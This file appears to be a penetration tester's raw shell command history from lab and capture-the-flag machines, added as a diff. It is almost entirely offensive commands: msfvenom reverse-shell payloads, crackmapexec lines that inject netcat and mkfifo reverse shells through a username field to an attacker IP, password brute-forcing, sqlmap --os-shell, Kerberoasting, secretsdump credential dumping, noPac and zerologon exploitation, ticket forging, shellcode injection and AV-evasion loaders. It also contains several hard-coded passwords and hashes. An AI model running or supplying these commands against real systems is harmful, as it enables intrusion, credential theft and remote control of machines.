@@ -1,0 +1,556 @@
+xfreerdp /u:admin /p:password /cert:ignore /v:10.10.218.14 /workarea
+gobuster dir -u http://10.10.222.32:82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"
+gobuster dir -u http://10.10.222.32:81/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"
+masscan -p1-65535 10.10.222.32 --rate=1000 -e tun0
+ntpdc -c monlist 10.10.222.32
+smbclient --no-pass -L //10.10.129.94
+smbclient -U '%' -N \\\\10.10.123.94\\King
+impacket-smbclient 10.10.123.94 
+enum4linux 10.10.123.94
+impacket-samrdump
+impacket-samrdump -no-pass 10.10.123.94
+rpcclient -U "" -N 10.10.129.94
+smbclient --no-pass -L //10.10.129.94\
+smbclient -U 'yvonne (1)' \\\\10.10.123.94\\IPC$
+impacket-GetNPUsers 'KingOfTheDomain/yvonne (1)' -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.123.94
+impacket-GetNPUsers offline.KingOfThe.Domain -dc-ip 10.10.123.94 -usersfile users.txt
+nmcli connection edit tun1
+sshpass -p '' ssh root@10.129.202.113 -v
+hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p 'mySQL_p@ssw0rd!:)' 10.129.202.113 -t 4 ssh -V
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
+ffuf -u http://horizontall.htb:80/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e ".txt,.html,.php,.asp,.aspx,.jsp" -v | tee /home/kali/Desktop/ReleaseArena/results/horizontall.htb/scans/tcp_80_http_ffuf_big.txt
+wpscan --url http://horizontall/
+sudo nikto -ask=no -h http://horizontall.htb:80 2>&1 | tee "/home/kali/Desktop/ReleaseArena/results/horizontall.htb/scans/tcp_80_http_nikto.txt"
+cewl http://10.129.205.53/
+git clone --branch beta https://github.com/Tib3rius/AutoRecon\
+feroxbuster -u http://10.129.84.202 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.16.19 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe -o shan.exe
+net use f: \\10.10.16.19\home
+impacket-smbserver home /home/kali -smb2support
+nmap -p21 --script ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 192.168.25.101
+feroxbuster -u http://192.168.25.101:7080/ -w /usr/share/wordlists/dirb/common.txt -x php txt js -s 200 301 -d 10 
+hydra -l paula -P /usr/share/wordlists/rockyou.txt http-get://192.168.25.97:8080/manager/html -f -V
+msfvenom --platform linux -p linux/x64/shell_reverse_tcp LHOST=10.10.19.25 LPORT=443 -f elf -o 
+bash fireguess.sh 192.168.25.108 sysdba masterkey
+isql-fb 
+posh-project -n Dante
+posh-config -d Dante
+posh-project -d Dante
+wpscan --url https://172.16.1.10/nav.php?page=/var/www/html/wordpress/ --force
+nmap -sC -p 21,135,139,445,5040,5985,47001,49664,49665,49666,49667,49668,49669,49670 -Pn 172.16.1.101 --proxies socks4://127.0.0.1:3333 -n
+wpscan --url http://10.10.11.39/ -e p --plugins-detection aggressive
+wpscan --url http://10.10.11.39/ -e u --plugins-detection aggressive
+wpscan --url http://10.10.11.39/ --wordlist /usr/share/wordlists/rockyou.txt --username joseph
+wpscan --url http://10.10.11.39/ -P /home/kali/Desktop/htbDedicated/results/10.10.11.39/exploit/cewlout.txt -U joseph
+wpscan --url http://10.10.11.39/ -P /home/kali/Desktop/htbDedicated/results/10.10.11.39/exploit/cewlout.txt -U Desktop/htbDedicated/results/10.10.11.39/exploit/username.txt
+wpscan --url http://10.10.11.39/ -P /usr/share/wordlists/rockyou.txt --basic-auth joseph:Label_Author_2021
+wpscan --url http://10.10.11.39/ -P /usr/share/wordlists/rockyou.txt --http-auth joseph:Label_Author_2021
+wpscan --url http://10.10.11.39/ --http-auth joseph:Label_Author_2021
+wpscan --url http://10.10.11.39/ --http-auth joseph:Label_Author_2021 -e ap
+wpscan --url http://10.10.11.39/ -e ap --plugins-detection aggressive
+wpscan --url http://10.10.11.39/ -e vp --plugins-detection aggressive
+wpscan --url http://10.10.11.39/ -e vt --plugins-detection aggressive
+wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.label.htb" -u http://label.htb -t 100\
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.label.htb" -u http://label.htb -t 100\
+gobuster vhost -u https://label.htb -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\
+sqlmap -u http://10.10.11.42/System/Sistema/Facturas/delete.php?id=1 --dbs --level 2
+mssqlclient.py 127.0.0.1 -port 3306
+sqlmap --wizard
+ldapsearch -LLL -x -H ldap://naught.htb.local -b'' -s base '(objectclass=\*)'
+sudo ruby /usr/share/metasploit-framework/msfrpc -U test -P test -a 10.10.11.23:55553
+sudo ruby /usr/share/metasploit-framework/msfrpc -U 'msf' -P 'password' -a 10.10.11.23 
+fpc -c mimikatz
+pythonq exploit.py --url http://jenkins-site.com --job job_name --username your_user --password your_passwd --cmd "cat /etc/passwd"\
+./jenkins-credentials-decryptor_1.2.0_Linux_x86_64 -m jenkins/master.key -s jenkins/hudson.util.Secret -c jenkins/credentials.xml
+./jenkins-credentials-decryptor_1.2.0_Linux_x86_64 -m jenkins/master.key -s jenkins/hudson.util.Secret -c jenkins/credentials.xml -o json
+./jenkins-credentials-decryptor_1.2.0_Linux_x86_64 -m jenkins/master.key -s jenkins/hudson.util.Secret -c jenkins/credentials.xml -o txt
+scp -i jenkins/id_jenkins sudo_inject-master/extra_tools/* james@10.10.11.6:/tmp/sudo/extra_tools
+cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"\
+crackmapexec winrm 10.10.11.29 -u Rob -p best64pass.txt -d PRATAI
+wpscan --url http://10.10.11.12/v1 --enumerate ap,at,cb,dbe && wpscan --url http://10.10.11.12/v1 --enumerate u,tt,t,vp --username ryder --passwords /usr/share/seclists/Passwords/darkweb2017-top1000.txt -e
+wpscan --url http://10.10.11.12/v1 --enumerate u,tt,t,vp --passwords /usr/share/seclists/Passwords/darkweb2017-top1000.txt -e
+wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com --api-token <API_TOKEN> --passwords /usr/share/seclists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)\
+ffuf -u http://10.10.11.115/Maintenance/FUZZ/login.jsp -w /usr/share/seclists/Discovery/Web-Content/common.txt -e ".txt,.html,.php,.asp,.aspx,.jsp,.js" -v 
+sudo feroxbuster -u http://10.10.11.115:80/Maintenance /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "xhtml,jsp" -v -k -n -o /home/kali/Desktop/htbDedicated/results/10.10.11.115/scans/tcp_80_http_feroxbuster_dirbuster.txt
+nikto -ask=no -h http://10.129.230.112:80
+evil-winrm -i 172.16.1.101 -u tony
+impacket-psexec tony@10.129.130.112
+sudo responder -wrf --lm -v -I tun0
+msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f psh -o reverse.psh
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 404 http://10.10.11.27:8080/cgi/FUZZ.bat
+cat /etc/samba/smb.conf | grep workgroup
+vim /etc/samba/smb.conf
+hydra -L tomcatusers.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 127.0.0.1 http-get /manager/html\
+feroxbuster -k -u http://127.0.0.1/examples -w /usr/share/wordlists/dirb/common.txt -x php txt asp aspx jar jsp html
+scp -i linpeas.sh james@10.10.11.6 -i jenkins/id_jenkins 
+scp -i jenkins/id_jenkins linpeas.sh james@10.10.11.6:/tmp/lin.sh
+echo 'Rob1!' | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout >> best64pass.txt
+gobuster vhost -u http://forge.htb -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://forge.htb/ -H "Host: FUZZ.forge.htb"
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.119.150 lport=80 -f vba -o rev.vba
+sudo python2.7 -m SimpleHTTPServer 80
+msfvenom --list formats
+enum4linux -a -u "" -p "" 10.11.1.20 && enum4linux -a -u "guest" -p "" 10.11.1.20
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='svcorp.com'" 10.11.1.14
+sqsh -S 10.11.1.31 -U sa -P poiuytrewq -D bankdb
+impacket-mssqlclient sa@10.11.1.31 -db bankdb
+gobuster dir -u https://10.11.1.44:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -b 400,404
+sudo droopescan scan drupal -u http://10.11.1.50
+cd Downloads/wesng-master
+./wes.py -u
+./wes.py ~/systeminfo.txt
+./wes.py ~/systeminfo.txt -e -i "Elevation"
+nmap 10.11.1.71 -p 80 \\
+  --script=http-shellshock \\
+  --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi
+sqlmap -u 'http://10.11.1.73:8080/index.php/?tg\=delegat\&idx\=mem\&id\=1'\
+--cookie "Cookie: OV1364928461=6kb5jvu7f6lg93qlo3vl9111f8" --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs
+sqlmap -u 'http://10.11.1.73:8080/index.php/?tg\=delegat\&idx\=mem\&id\=1' --cookie "Cookie: OV2964716481=d6g3t70avau2142t9sh4b3l6f2" --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs
+sqlmap -r request --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs --os-cmd whoami
+sqlmap -r request --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs --os-pwn
+sqlmap -r request --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs --os-shell
+sudo apt install -y golang
+export GOROOT=/usr/lib/go
+export GOPATH=$HOME/go\
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH\
+sudo nmap -n -Pn -sU -p69 -sV --script +tftp-enum 10.11.1.111\
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.11.1.111\
+smbmap -H 10.11.1.115 -P 139
+bash smbver.sh 10.11.1.115 139
+crackmapexec smb --shares 10.11.1.136 -u '/=`nohup mkfifo /tmp/hago; nc 192.168.119.158 139 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago`' -p ''\
+crackmapexec smb -x "./=`nohup nc -e /bin/sh 192.168.119.158 139`" --exec-method smbexec 10.11.1.136
+python results/10.11.1.136/exploit/smbvulnexploit.py 10.11.1.136 139 192.168.119.158 139
+smbmap -H 10.11.1.136 -P 139
+john outhash.rxr --wordlist=/usr/share/wordlists/rockyou.txt
+sshpass -p"BUGZBUNNY" ssh bob@10.11.1.141 -oKexAlgorithms=diffie-hellman-group-exchange-sha1
+dirsearch -u https://10.11.1.217/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,txt\
+dirb -u https://10.11.1.217/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,txt\
+gobuster dir -u https://10.11.1.217 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -b 400,404
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.193 LPORT=8080 -f war -o rshell.war\
+sqlmap -r ~/229request --level 2 --dbms=mssql -p 'ctl00%24MainContent%24UsernameBox' --dbs --os-shell
+smbclient \\\\10.11.1.231\\docs -U anonymous
+wpscan --url http://10.10.11.234/ --enumerate ap,at,cb,dbe
+sudo autorecon 10.11.1.237 -p 22,80,111,443,44107 -v
+cadaver http://10.11.1.237/webdav/
+hashcat -m 1600 -a 0 password.dav /usr/share/wordlists/rockyou.txt
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.173 LPORT=80 CMD=/bin/bash -f js_le -e generic/none
+impacket-secretsdump -just-dc-ntlm sv-dc01\$@10.11.1.20 -outputfile ntlmhashes.hash
+crackmapexec smb 10.11.1.20 -u alice -H ntlmhashes.hash.ntds
+impacket-GetADUsers -dc-ip 10.11.1.20 10.11.1.20
+cp ntlmhashes.hash.ntds user.hash
+crackmapexec smb 10.11.1.20 -u Administrator -H -M empire_exec -o LISTENER=https
+crackmapexec smb 10.11.1.20 -u Administrator -H -M empire_exec -o LISTENER=http --options
+crackmapexec smb 10.11.1.20 -u Administrator -H -M empire_exec --options
+crackmapexec smb 10.11.1.20 -u Administrator -H -M empire_exec -o LISTENER=tcp
+crackmapexec smb 10.11.1.20 -u Administrator -H M bloodhound
+crackmapexec smb 10.11.1.20 -u Administrator -H -M shellcode_inject -o PATH=/var/poshc2/OffSec/payloads/Posh_v2_Donut_x86_Shellcode.bin
+crackmapexec smb 10.11.1.20 -u Administrator -H -M shellcode_inject -o PATH=/var/poshc2/OffSec/payloads/Posh_v2_Donut_x86_Shellcode.bin --server-port 80
+crackmapexec smb 10.11.1.20 -u Administrator -H -M bloodhound -o collectionmethod=neo4j --options
+crackmapexec smb 10.11.1.20 -u Administrator -H -M shellcode_inject -o PATH=/var/poshc2/OffSec/payloads/Posh_v4_x64_Shellcode.bin
+john --format=nt --wordlist=passwordlist.txt Downloads/zerologon-master/ntlmhashes.hash.ntds 
+john --format=nt --wordlist=passwordlist.txt Downloads/zerologon-master/ntlmhashes.hash.ntds --show
+mount -t nfs [-o vers=2] 10.11.1.72/home /mnt/
+mount -t nfs 10.11.1.72/home /mnt/ -o nolock
+sudo mount -t nfs 10.11.1.72:/home /mnt/nfs -o nolock
+vim creds.txt
+cd ryuu
+cd marcus
+nc 10.11.1.72 25
+ls -lRa
+mkdir -p /mnt/nfs/*/test
+umount /tmp/nfs
+umount /mnt/nfs
+sudo umount /mnt/nfs
+sudo mount -t nfs -o ver=2 10.11.1.72:/home /mnt/nfs
+sudo dnsrecon -n 10.11.1.120 -d xor 2>&1 | tee /home/kali/Desktop/offsec/results/10.11.1.120/scans/tcp53/tcp_53_dnsrecon_default_manual.txt
+impacket-GetADUsers -dc-ip 10.11.1.120 10.11.1.120
+impacket-GetADUsers xor-dc01.xor.com -no-pass
+impacket-GetADUsers xor-dc01.xor.com user@xor.com
+impacket-GetADUsers -dc-ip 10.11.1.120 xor/anonymous
+impacket-GetUserSPNs
+gobuster dir -u https://10.11.1.123/xampp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -b 400,404
+hash-identifier 3fee04b01f59a1001a366a7681e95699\
+impacket-GetUserSPNs -request -dc-ip 10.11.1.120 xor.com/extmailservice -outputfile hashes.kerberoast
+kirbi2hashcat
+python kirbitohash.py /usr/share/wordlists/rockyou.txt *
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt 1.kirbi
+hashcat -m 13100 kereroast.txt /usr/share/wordlists/rockyou.txt -a 0 --force
+sudo GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" .
+gobuster dir --proxy socks5://127.0.0.1:5000 -u http://10.1.1.27 --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -x php
+sshuttle -vNHr megan@10.1.1.27 127.0.0.1/24
+./chisel server -p 3477 --socks5 --reverse -v
+socat FILE:powercat.ps1 TCP:192.168.174.129:13510
+sudo update-java-alternatives -s java-1.11.0-openjdk-amd64\
+sudo feroxbuster -u http://10.10.110.12:80 -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k
+hashcat -m 1000 -a 0 Desktop/genesis/ntlmhashGenesis.hash /usr/share/wordlists/rockyou.txt -r Downloads/OneRuleToRuleThemAll.rule
+crackmapexec smb 10.10.110.3 -u mrb3n -H 'W3lc0me123!!!' --continue-on-success -x 'powershell whoami'
+crackmapexec smb 10.10.110.3 -u DC01-PHOBOS\Administrator -H aad3b435b51404eeaad3b435b51404ee --continue-on-success
+impacket-psexec 'SRV01-ARTEMIS$'@10.10.110.5 -k -no-pass
+impacket-ticketer -nthash 5d7bf30ba2313a23fb20114b95bf2462 -domain-sid S-1-5-21-159412046-1321979540-3513300905 -domain genesis.local -spn cifs/SRV01-ARTEMIS.genesis.local rbiscuit
+export KRB5CCNAME=/home/kali/Desktop/genesis/rbiscuit.ccache
+chmod 600 sshid
+sudo sqlmap --flush-session --threads=10 --dbms=mysql --data="username=testing&password=ffff" --url http://10.10.110.45/login --current-user --os-shell
+sudo sqlmap --flush-session --threads=10 --dbms=mysql --data="username=testing" --url http://10.10.110.45/login --random-agent --risk 3 --level 5 --dbs --os-shell --technique=T
+python sqlmap.py --flush-session --threads=10 --dbms=mysql --data="username=testing" --url http://10.10.110.45/login --current-user --risk 5 --level 5
+wpscan --url http://10.10.110.119/ --enumerate ap,at,cb,dbe
+sudo sqlmap --flush-session -threads 10 --level 2 -a --url http://10.10.110.60/products?search=* --dbms SQlite
+sudo sqlmap --flush-session -threads 10 --level 2 -a --url http://10.10.110.60/products?search=* --dbms SQlite --os-shell
+hydra -l anonymous -P pass.txt 10.10.110.60 ftp -V
+hashcat -O -m 400 -a 0 wordpress.txtr /usr/share/wordlists/rockyou.txt
+nmap -vv --reason -Pn -T4 -sV -p 139 --script="smb-vuln-ms07-029" --script-args="unsafe=1" 172.16.1.15
+sudo responder -wrf --lm -v -I tun1
+sudo responder --lm -v -I tun1 -wrf
+responder -w on -r on -f on --lm -v -I eth0
+sudo powershell-empire client --user admin --password password
+sudo powershell-empire -h
+sudo vim /etc/powershell-empire/client/config.yaml
+nmap -vv --reason -Pn -T4 -sV -p 12445 --script="banner,(+nbstat or +smb* or +ssl*) and not (brute or broadcast or dos or external or fuzzer)"
+nmap -vv --reason -Pn -T4 -sV -p 12445 --script=+smb*
+nmap -vv --reason -Pn -T4 -sV -p 12445 --script="+smb* and not (brute or broadcast or dos or external or fuzzer)" 192.168.138.125
+sudo cp ~/Downloads/Girsh /usr/local/bin/girsh
+sudo sqlmap -r sqlrequest.txt --dbms mssql -p 'ctl00%24ContentPlaceHolder1%24UsernameTextBox' --dbs -t TN --users --passwords --all
+ldapsearch -x -h 192.168.65.122 -D '' -w '' -b "DC=hutch,DC=offsec"
+openssl req -newkey rsa:2048 -nodes -keyout socat.key -x509 -days 1000 -subj '/CN=test.local/O=test/C=US' -out socat.crt
+socat -d -d OPENSSL-LISTEN:80,cert=socat.pem,verify=0,fork STDOUT
+socat FILE:`tty`,raw,echo=0 TCP4:192.168.188.10:80
+sudo msfvenom --platform windows -p windows/shell_reverse_tcp -b "\x00" LHOST=192.168.49.85 LPORT=443 EXITFUNC=process -f msi -o rev.msi
+sudo tcpdump -A -n "tcp[13] & (2|4|16) != 0" -r password_cracking_filtered.pcap | wc -l
+sudo tcpdump -A -n "tcp[13] & (2|4|16) != 0" -r password_cracking_filtered.pcap
+sudo tcpdump "tcp[13] & (2|4|16) != 0" -r password_cracking_filtered.pcap | wc -l
+theHarvester -d megacorpone.com -b
+theHarvester -d megacorpone.com -b yahoo
+theHarvester -d megacorpone.com -b shodan
+theHarvester -d megacorpone.com -b threatminer
+theHarvester -d megacorpone.com -b zoomeye
+theHarvester -d megacorpone.com -b twitter
+theHarvester -d megacorpone.com -b threatcrowd
+theHarvester -d megacorpone.com -b otx
+theHarvester -d megacorpone.com -b bing
+theHarvester -d megacorpone.com -b linkedin
+dnsrecon -d megacorpone.com -a
+sudo powershell-empire server --username admin --password password
+sudo powershell-empire client --user admin --pass password
+sudo powershell-empire client admin password
+sudo powershell-empire client -c
+sudo powershell-empire client -h
+powershell-empire server --username empireadmin --password password123
+sudo responder -I tun0 -Pv --lm
+sudo autorecon 10.129.96.23 --dirbuster.wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -v
+impacket-smbserver public . -debug
+python3 sambahunter.py -s 172.16.10.66 -c 'wget http://172.16.10.249/test'
+impacket-wmiexec agrofield@172.16.10.80 -hashes :71de7e6e3ee931f49b271538e60998ab
+nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port 110 172.16.10.22
+nmap -sVC -p 33060 172.16.10.22 --script socks-auth-info
+ffuf -c -r -t 200 -mc 200 -e .html,.php,.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.16.10.44/FUZZ
+rdesktop -d megacorpone.com -u ruben -p Password1! 172.16.10.22
+impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
+smbpasswd -h
+smbpasswd -U M.Mason -r 192.168.111.175
+impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.111.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+impacket-GetNPUsers xor.com/ -dc-ip 10.11.1.120 -usersfile user.txt
+impacket-GetUserSPNs -request -dc-ip 10.11.1.120 xor/sqlserver -outputfile hashes.kerberoast
+impacket-psexec sqlservice@10.11.1.120 -k -no-pass
+sudo john sql.kirbi --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
+python3 tgsrepcrack.py
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt sql.ccache
+kirbi2john
+kirbi2john sql.kirbi
+kirbi2ccache -v sql.kirbi sql.ccache
+hashcat -m 13100 --force -a 0 sql.ccache /usr/share/wordlists/rockyou.txt
+vim hashes.kerberoast
+crackmapexec smb 10.11.1.120-124 -u sqlServer -d xor.com -p shantewhite --shares
+sudo feroxbuster -u http://monster.pg/blog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,php,html,js" -k -d 5 --filter-status 403
+echo '63f576276a6db59bb750c34f126945c1e941f9e3b21ab2f5be74ae00cc8abfc1b9f7ee5840f9abdae46efc0ee5350bd65aa8' | openssl enc -aes-128-cbc -a -d -salt -pass pass:0Vq2cDMrPt
+sudo feroxbuster -u http://breakout/users -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,php,html,js" -k -d 5 --filter-status 301 302
+smbmap -H 192.168.88.71 -P 445 2>&1
+ncrack -p 22 --user neil --pass neil 192.168.88.71 -T 5 -v
+wpscan --url http://muddy.ugc --plugins-detection mixed -t 30
+./mdxfind
+hashcat -m 5600 nethash.txt /usr/share/wordlists/rockyou.txt --force --show
+hashcat -m 5600 nethash.txt /usr/share/wordlists/rockyou.txt --force -o out.txt
+ssh keygen
+enum4linux -a -u "" -p "" 172.16.10.127
+ldapsearch -x -h 172.16.10.127 -D '' -w '' -b "DC=dc02,DC=Prominent2" \
+nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt 172.16.10.127
+ldapsearch -LLL -x -H ldap://172.16.10.127 -b'' -s base '(objectclass=\*)'
+crackmapexec smb 172.16.10.125 -u '' -p '' --shares
+impacket-GetADUsers -dc-ip 172.16.10.126 -all prominent.tech/j.smith:verystrongpassword@2022 > users.txt
+impacket-getArch -request -dc-ip 172.16.10.126 prominent.tech/j.smith
+kerbrute passwordspray -d test.local domain_users.txt password123
+bloodhound-python -u a.gunn --hashes -ns 172.16.10.127 -d prominent.tech -c all
+mitmproxy --mode socks5
+mitmproxy --mode socks5 --tcp-hosts
+sudo netsed tcp 9000 10.0.2.4 9001 's/%23%29/test'
+nmap -vv --reason -Pn -T4 -sV -p 8343 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" 
+python3 weblogiccheck.py -u -c 'uname -r > /tmp/success' -i 10.100.100.77\
+wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.amzcorp.local" -u http://amzcorp.local -t 100
+gobuster vhost -u http://amzcorp.local -t 50 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt\
+wpscan --url --enumerate ap,at,cb,dbe --force
+sudo sqlmap -r request.txt --dbms=mysql -D consult -T users -C password --dump
+sudo autorecon 46.101.54.91 -p T:32605 --dirbuster.wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -v
+python3 jwt_tool.py -M at -t "http://" -rh "Cookie: session="
+sudo sqlmap -u "http://209.97.177.45:30846/posts/2*" --dbms mysql -D tannen_memorial -T keystore -C secret,kid --dump
+sudo sqlmap -u "http://209.97.177.45:30846/posts/2*" --dbms mysql -D tannen_memorial -T keystore -C secret,kid,'PRIMARY KEY' --dump
+sudo sqlmap -u "http://209.97.177.45:30846/posts/2*" --dbms mysql -D tannen_memorial -T keystore --dump-all
+sudo sqlmap -u "http://46.101.54.91:32425/posts/2*" --dbms mysql -D tannen_memorial -T keystore --dbs --dump-all
+python2.7 vol.py imageinfo -f /home/kali/Desktop/memory.raw
+python2.7 vol.py windows.filescan -f /home/kali/Desktop/memory.raw
+python2.7 vol.py filescan -f /home/kali/Desktop/memory.raw
+python3 SharPyShell.py generate -p 4d65bdbad183f00203b1e80cf96fba549663dabeab12fab153a921b346975cdd
+ffuf -c -r -t 200 -mc 200 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://fronttofuture.htb/php/FUZZ.php -rate 100 -b "session=.eJwljs1qwzAQhF9F6BzK6m8l-SlyL8GsVqvY1I2L5ZxC3r0qPQ3fzDDMS89to75I19PnS6tziP6W3uku-qKvm1AXte13tT7UuStiHqE6l7Wrn9H50Lf37TJGDumLns7jKYPWqidtQxFbWcCAxEC2-hAwupjIBSM1ITnmBgwGPbuE4pov6Mhh9ImzowTBYpUg0YeC1Te0rlRPNvmYIYdgkIGTb0kQIdtAla2RhM5Z4r_787PL8f8mDeR-tPncv-QxDIPFgoUWJVONHpqNBh34nDHmUHOBXA3kqN-_m49UWw.YwGDmw.5_6BrYctmrgZicLNNgzcUpm8nnE"
+ffuf -c -r -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://fronttofuture.htb/php/FUZZ.php -b "token=gASVGQAAAAAAAACMBG1haW6UjAlHdWVzdFVzZXKUk5QpgZQu"
+cat words.txt | rsmangler -m 6 -x 8 --file - > mangled.txt
+rsmangler -m 5 -x 16 -u -l -d -p -t -y --file words.txt > mangled.txt
+sudo sqlmap -r query --is-dba
+sudo sqlmap -r query --privileges
+sudo sqlmap -r query --sql-shell
+sudo responder -F -v -d -I tun0
+crackmapexec smb 10.129.96.6 -u KPrice -p 'sunshine!@' -d megacorp.local -M zerologon
+crackmapexec smb 10.129.96.6 -u KPrice -p 'sunshine!@' -d megacorp.local -M zerologon --options
+crackmapexec smb 10.129.96.6 -u KPrice -p 'sunshine!@' -d megacorp.local -L
+crackmapexec smb 10.129.96.6 -u KPrice -p 'sunshine!@' -d megacorp.local -M nopac --options
+crackmapexec smb 10.129.96.6 -u KPrice -p 'sunshine!@' -d megacorp.local -M nopac
+python scanner.py megacorp.local/KPrice:'sunshine!@' -dc-ip 10.129.96.6 -dc-host dc -use-ldap
+python noPac.py megacorp.local/KPrice:'sunshine!@' -dc-ip 10.129.96.6 -dc-host dc -use-ldap
+python3 noPac.py MEGACORP.LOCAL/KPrice:'sunshine!@' -dc-ip 10.129.96.6 -shell --impersonate administrator -use-ldap
+git clone https://gitlab.com/akihe/radamsa.git && cd radamsa && make && sudo make install\
+python3 SharPyShell.py generate -p somepassword --obfuscator encrypted_dll_ulong_compression
+python3 SharPyShell.py generate -p password --obfuscator encrypted_dll_ulong_compression
+python3 SharPyShell.py interact -u http://192.168.1.137/webapp/shellpass.aspx -p password
+unix2dos post_request_000.txt
+sudo vim /etc/proxychains.conf
+rsmangler -m 5 -x 16 -u -l -d -p -t -y --file user.txt > mangled.txt
+whatweb --no-errors -a 3 -v https://portal.gov.perspecta.cloud/assets 2>&1
+sudo sqlmap -r request.txt --dbms=PostgreSQL --level 5 --risk 3
+sudo sqlmap -r request.txt --dbms=PostgreSQL --random-gent
+sudo sqlmap -r request.txt --dbms=PostgreSQL --random-agent
+curl -ku admin:admin https://
+sudo cp /home/kali/Downloads/burpsuite_pro_v2022.8.4.jar /usr/local/share/burpsuitepro/burpsuite_pro.jar
+sqlmap -v
+sudo apt install golang
+export GOROOT=/usr/lib/go\
+export GOPATH=$HOME/go\
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor lhost=192.168.1.228 lport=1000 -f c -o msf.bin
+./ScareCrow_4.11_linux_amd64 -I msf.bin -domain www.microsoft.com -Loader binary
+sudo autorecon --dirbuster.wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -v
+python3 multipleportsHTTP.py
+vim multipleportsHTTP.py
+sudo curl -o "~/.config/bloodhound/customqueries.json" "https://raw.githubusercontent.com/CompassSecurity/BloodHoundQueries/master/customqueries.json"
+dpkg-query --show --showformat='${Installed-Size}\t${Package}\n' | sort -rh | head -25 | awk '{print $1/1024, $2}'
+apt list --upgradeable
